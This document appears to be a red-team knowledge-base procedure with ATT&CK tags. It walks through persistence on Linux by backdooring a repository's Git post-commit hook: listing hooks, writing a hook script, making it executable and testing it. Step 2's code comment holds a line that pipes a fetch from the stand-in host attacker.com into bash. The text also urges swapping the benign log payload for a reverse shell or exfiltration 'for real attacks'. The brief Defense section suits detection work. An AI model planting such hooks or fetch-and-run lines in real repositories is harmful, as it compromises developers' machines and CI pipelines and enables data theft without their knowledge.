---
id: 9736e617-19e3-42e4-95ab-edaea93405b0
name: Git-Hook-Backdoor-Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.326844+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Modify Existing Service|T1031 - Modify Existing Service]]'
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Backdooring Git]]'
  - '[[tags/Git Hooks]]'
  - '[[tags/Linux - Persistence]]'
commands:
  - '[[commands/list-git-hooks]]'
  - '[[commands/make-git-hook-executable]]'
  - '[[commands/create-post-commit-hook]]'
platforms:
  - Linux
tools: []
validated: true
---

# Git-Hook-Backdoor-Persistence

## Summary

This procedure demonstrates how to establish persistence on a Linux system by backdooring Git hooks in a repository's .git directory. Git hooks are client-side scripts that execute automatically during Git operations like commits or pushes. By modifying or creating a hook such as post-commit, an attacker can inject malicious code that runs every time a developer performs a Git action, allowing for command execution, data exfiltration, or further compromise without direct system access.

## Description

Git hooks reside in the .git/hooks/ directory of a repository and trigger on events like pre-commit, post-commit, pre-push, or post-merge. These scripts are typically written in shell, Python, or Perl and must be executable to run. In a red team scenario, an attacker with write access to the repository (e.g., via initial foothold or supply chain compromise) can replace a sample hook or create a new one containing backdoor code. For example, a post-commit hook could silently execute a reverse shell or log keystrokes each time a commit occurs. This technique evades detection because hooks are legitimate Git features and often overlooked in security reviews. It targets developer workstations or CI/CD environments where Git is frequently used. Success relies on the hook remaining in place and the target user continuing Git operations.

## Requirements

1. Shell access to the target system with write permissions to the Git repository's .git/hooks directory (e.g., local user or via initial access vector).
2. A cloned or existing Git repository on the target.
3. Basic knowledge of shell scripting to craft the backdoor payload.
4. No additional tools beyond standard Linux utilities like bash and chmod.

## Defense

- Regularly audit Git hooks in repositories using scripts to diff against known good states or monitor file changes in .git/hooks/.
- Restrict write access to repositories using Git hosting platform permissions (e.g., GitHub branch protection) and enforce repository scanning in CI/CD pipelines.
- Monitor system logs (e.g., via auditd) for executions from .git/hooks/ paths and anomalous processes spawned during Git operations.
- Educate developers on reviewing hook contents and disable client-side hooks in controlled environments.

## Objectives

1. Achieve persistence by ensuring malicious code executes automatically on Git events.
2. Maintain a foothold for lateral movement or data collection without alerting endpoint detection.
3. Execute arbitrary commands in the context of the user running Git, potentially escalating privileges if combined with other techniques.

## Instructions

### Step 1: Locate and Inspect Existing Hooks

**Context**: First, navigate to the repository's .git/hooks directory to identify existing hooks and avoid overwriting legitimate ones unnecessarily. This step verifies the environment and lists sample or active hooks.

**Command** ([[commands/list-git-hooks]]):
```bash
ls -la .git/hooks/
```

> This command lists all files in the hooks directory with permissions and details. Look for executable scripts (e.g., post-commit.sample) that can be modified or renamed for activation.

**Expected Output**:
```
total 24
-rw-r--r-- 1 user user  452 Apr  6 03:56 pre-commit.sample
-rw-r--r-- 1 user user 1163 Apr  6 03:56 prepare-commit-msg.sample
-rwxr-xr-x 1 user user  123 Apr  6 03:56 post-commit  # Example active hook
...
```

### Step 2: Create a Backdoor Hook Script

**Context**: Select a hook like post-commit, which runs after every commit, and create or append malicious code. For demonstration, add a simple payload that writes a marker file or executes a command (in practice, replace with reverse shell or exfiltration logic). Ensure the script starts with #!/bin/bash for proper execution.

**Command** ([[commands/create-post-commit-hook]]):
```bash
cat > .git/hooks/post-commit << 'EOF'
#!/bin/bash
# Backdoor payload: Example - log commit to attacker location or spawn shell
echo "Commit executed by user: $USER at $(date)" >> /tmp/backdoor.log
# Replace with actual payload, e.g., curl -s http://attacker.com/exfil?data=$PWD | bash
EOF
```

> This creates a new post-commit hook with a benign example payload. Customize the payload for real attacks, such as downloading and executing a script or establishing persistence.

**Expected Output**: No direct output; verify with [[commands/list-git-hooks]] showing the new file.

### Step 3: Make the Hook Executable

**Context**: Git only runs hooks if they are executable. This step sets the +x permission on the backdoor script to ensure it triggers on the next Git event.

**Command** ([[commands/make-git-hook-executable]]):
```bash
chmod +x .git/hooks/post-commit
```

> This modifies file permissions to make the hook runnable. Confirm with ls -la to see the 'x' flags.

**Expected Output**: Permission change confirmation (no stdout); re-run [[commands/list-git-hooks]] to verify:
```
-rwxr-xr-x 1 user user  200 Oct  1 00:00 post-commit
```

### Step 4: Test the Hook

**Context**: Commit a dummy change to trigger the hook and verify execution. This confirms persistence without alerting the user.

**Instructions**: Stage and commit a test file (e.g., touch test.txt && git add test.txt && git commit -m "test" ). Check for payload effects, like the /tmp/backdoor.log file.

**Expected Output**: Git commit succeeds, and payload runs silently. For the example:
```
[main abc1234] test
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 test.txt
cat /tmp/backdoor.log
Commit executed by user: user at Mon Oct 1 12:00:00 UTC 2023
```
